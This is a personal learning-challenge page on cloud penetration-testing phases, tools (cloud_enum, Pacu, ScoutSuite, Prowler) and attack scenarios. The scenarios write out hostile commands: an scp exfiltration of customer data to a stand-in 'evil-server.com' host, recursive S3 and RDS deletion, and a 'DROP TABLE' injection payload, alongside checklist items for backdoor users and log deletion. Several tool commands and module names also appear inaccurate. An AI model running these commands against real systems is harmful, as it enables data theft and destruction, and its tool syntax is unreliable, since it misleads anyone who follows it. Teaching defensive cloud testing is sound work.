# Day 075 - Cloud Pen Testing: Methodology & Tools

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Cloud Security | **Difficulty:** Advanced

---

## 🧠 The Concept

Cloud pen testing = authorized testing of cloud infrastructure.

Goal: Find vulnerabilities before attackers do.

Traditional pen testing (network, servers) doesn't translate to cloud.

**Cloud penetration testing has different attack surface, different tools, different methodology.**

---

## 🎯 Cloud Pen Testing Phases

```
1. Reconnaissance
   ├─ Identify cloud infrastructure (S3 buckets, instances, VPCs)
   ├─ Find subdomains (dns, api endpoints)
   ├─ Scan for publicly exposed services
   └─ Gather intelligence (OSINT)

2. Scanning & Enumeration
   ├─ List cloud resources (buckets, instances, databases)
   ├─ Check IAM permissions
   ├─ Identify misconfigurations
   └─ Find security group gaps

3. Vulnerability Assessment
   ├─ Scan for CVEs
   ├─ Check encryption status
   ├─ Test authentication mechanisms
   └─ Identify weak policies

4. Exploitation
   ├─ Exploit misconfigurations (public S3 bucket)
   ├─ Exploit IAM weaknesses (privilege escalation)
   ├─ Exploit application vulnerabilities
   └─ Move laterally across cloud

5. Post-Exploitation
   ├─ Establish persistence
   ├─ Exfiltrate data
   ├─ Move to other accounts/subscriptions
   └─ Hide tracks

6. Reporting
   ├─ Document findings
   ├─ Provide remediation steps
   └─ Executive summary
```

---

## 🔍 Cloud Pen Testing Tools

### cloud_enum (Enumerate Cloud Resources)

```bash
# cloud_enum: Find all cloud resources
pip install cloud_enum

# Enumerate AWS resources
cloud_enum -k AKIAIOSFODNN7EXAMPLE -s wJalrXUtnFEMI/K7MDENG/ -t aws

# Output:
# AWS Buckets Found:
#   - s3://backup-2024
#   - s3://public-images
#   - s3://confidential-docs
#
# AWS IAM Users:
#   - john.doe@company.com
#   - service-account
#
# AWS EC2 Instances:
#   - i-0123456789abcdef0 (prod-server)
#   - i-9876543210fedcba (dev-server)
```

### Pacu (AWS Exploitation Framework)

```bash
# Pacu: AWS penetration testing framework
git clone https://github.com/RhinoSecurityLabs/pacu

# Enumerate AWS permissions
pacu> whoami
# Returns: Your current IAM identity

pacu> aws_enum
# Scans all AWS services, reports findings

pacu> s3_bucket_enum
# Lists all S3 buckets you can access

pacu> check_iam_permissions
# Tests all IAM permissions (what can you do?)
```

### CloudMapper

```bash
# CloudMapper: Visualize AWS infrastructure
git clone https://github.com/duo-labs/cloudmapper

# Create network diagram
python cloudmapper.py collect
python cloudmapper.py report

# Output: SVG diagram showing:
# - VPCs
# - Security groups
# - EC2 instances
# - S3 buckets
# - RDS databases
# - All connections
```

### ScoutSuite

```bash
# ScoutSuite: Multi-cloud security auditor
pip install scout-suite

# Audit AWS account
scout aws --profile default

# Audit Azure subscription
scout azure

# Output: HTML report with:
# - Misconfigured resources
# - IAM findings
# - Security group issues
# - Encryption status
# - Compliance issues
```

### Prowler

```bash
# Prowler: AWS security assessment
git clone https://github.com/prowler-cloud/prowler

./prowler aws

# Output:
# [CRITICAL] S3 bucket is public
# [HIGH] RDS database not encrypted
# [MEDIUM] Security group allows SSH from 0.0.0.0/0
# [LOW] CloudTrail not configured
```

---

## 🔐 Common Cloud Vulnerabilities

### 1. Public S3 Bucket Enumeration

```bash
# Find public S3 buckets
s3_login.py
# Uses: AWS account to enumerate

# Manual enumeration
aws s3 ls s3://target-bucket/

# If public:
aws s3 cp s3://target-bucket/sensitive-file.txt .
```

### 2. Weak IAM Policies

```bash
# Check if role allows privilege escalation
pacu> check_iam_privileges
# Tests: Can you assume admin role?
#        Can you modify policies?
#        Can you create new access keys?

# Example escalation:
iam:CreateAccessKey on admin user
→ Create access key for admin
→ Use admin credentials
→ Full account access
```

### 3. Unencrypted Data

```bash
# Find unencrypted resources
prowler aws -g cis

# Reports:
# [CRITICAL] RDS database not encrypted
# [CRITICAL] S3 bucket not encrypted
# [HIGH] EBS volume not encrypted
```

### 4. Exposed Credentials

```bash
# Find hardcoded credentials in code
git clone https://target-repo
truffleHog filesystem .

# Finds:
# AWS_ACCESS_KEY_ID = "AKIA..."
# DB_PASSWORD = "..."
# API_KEY = "..."
```

### 5. Lambda Function Exploitation

```python
# Test Lambda function for vulnerability
import boto3

lambda_client = boto3.client('lambda')

# Invoke function with payload
response = lambda_client.invoke(
    FunctionName='target-function',
    InvocationType='RequestResponse',
    Payload=json.dumps({
        'query': 'SELECT * FROM users'  # SQL injection test
    })
)

print(response['Payload'].read())
# If vulnerable: Returns user data
```

---

## 📋 Cloud Pen Testing Checklist

```
Reconnaissance
☐ Identify target cloud provider (AWS, Azure, GCP)
☐ Find subdomains (*.target.com)
☐ Search for exposed repositories (GitHub, GitLab)
☐ Check DNS records (MX, CNAME, A records)
☐ Identify API endpoints
☐ Search for publicly exposed data (Shodan, Censys)
☐ OSINT on company (LinkedIn, job postings)

Enumeration
☐ Enumerate S3 buckets (public/private)
☐ Enumerate IAM users and roles
☐ Enumerate EC2 instances
☐ Enumerate security groups
☐ Check RDS configurations
☐ Identify Lambda functions
☐ List DynamoDB tables
☐ Check for exposed credentials

Vulnerability Assessment
☐ Check encryption status (at rest, in transit)
☐ Test authentication (MFA, weak passwords)
☐ Check IAM policies for wildcards
☐ Test security group rules (overly permissive)
☐ Check backup configurations
☐ Test CloudTrail logging
☐ Check network ACLs
☐ Verify logging is enabled

Exploitation
☐ Attempt S3 bucket access (public)
☐ Attempt privilege escalation (IAM)
☐ Attempt lateral movement (cross-account)
☐ Attempt to access databases (weak credentials)
☐ Attempt to exploit Lambda (code injection)
☐ Attempt to access metadata service (EC2)
☐ Attempt to exfiltrate data
☐ Attempt to establish persistence

Post-Exploitation
☐ Create backdoor user (persistent access)
☐ Exfiltrate sensitive data
☐ Move to other subscriptions
☐ Hide tracks (delete logs, cover activities)
☐ Escalate to higher privileges
☐ Map infrastructure (what else can we access?)

Reporting
☐ Document all findings (with evidence)
☐ Calculate risk scores
☐ Provide remediation steps
☐ Executive summary
☐ Technical details for security team
☐ Proof of concept code
☐ Evidence (screenshots, logs)
```

---

## 🎯 Attack Scenarios

### Scenario 1: Public S3 → Data Exfiltration

```bash
Step 1: Enumerate buckets
aws s3 ls

Step 2: Found public bucket
s3://customer-data-backup

Step 3: Download all files
aws s3 cp s3://customer-data-backup . --recursive

Step 4: Exfiltrate
scp -r customer-data-backup/ attacker@evil-server.com

Impact:
├─ 1 million customer records exposed
├─ Breach notification required
├─ $5M+ in damages
└─ Regulatory fines
```

### Scenario 2: Weak IAM → Account Takeover

```bash
Step 1: Find IAM user
cloud_enum identifies: service-account

Step 2: Check permissions
pacu> check_iam_privileges service-account

Step 3: Find privilege escalation path
iam:CreateAccessKey → Create key for admin user

Step 4: Assume admin role
export AWS_ACCESS_KEY_ID=new_key
export AWS_SECRET_ACCESS_KEY=new_secret
aws sts get-caller-identity

Step 5: Full account compromise
aws s3 rm --recursive s3://critical-data
aws rds delete-db-instance --db-instance-identifier prod-database

Impact:
├─ All data deleted
├─ Business downtime
├─ $50M+ in damages
└─ Criminal charges (if intentional)
```

### Scenario 3: Lambda Code Injection

```python
Step 1: Identify vulnerable Lambda
# Function processes user input without validation

def lambda_handler(event, context):
    query = event['query']
    return database.query(query)  # Direct query execution!

Step 2: Exploit with injection
response = lambda_client.invoke(
    FunctionName='vulnerable-lambda',
    Payload=json.dumps({
        'query': "'; DROP TABLE users; --"
    })
)

Step 3: Database compromised
# Users table deleted

Impact:
├─ Data loss
├─ Application downtime
├─ Customer impact
└─ Breach investigation
```

---

## 🔑 Key Takeaways

- **Cloud pen testing requires different tools** - cloud_enum, Pacu, ScoutSuite vs. Nessus
- **Enumeration is the key** - identify what exists before exploiting
- **IAM is the target** - weaknesses here = full account compromise
- **Misconfigurations are common** - public buckets, weak policies, no encryption
- **Lateral movement is different** - cross-account, cross-service instead of network subnets
- **Authorization is required** - always get written approval before testing

---

## 📚 Resources

- [OWASP Cloud Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [cloud_enum GitHub](https://github.com/initstring/cloud_enum)
- [Pacu GitHub](https://github.com/RhinoSecurityLabs/pacu)
- [CloudMapper GitHub](https://github.com/duo-labs/cloudmapper)

---

## [⬅️ Day 074](../day074/) | [➡️ Day 076](../day076/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*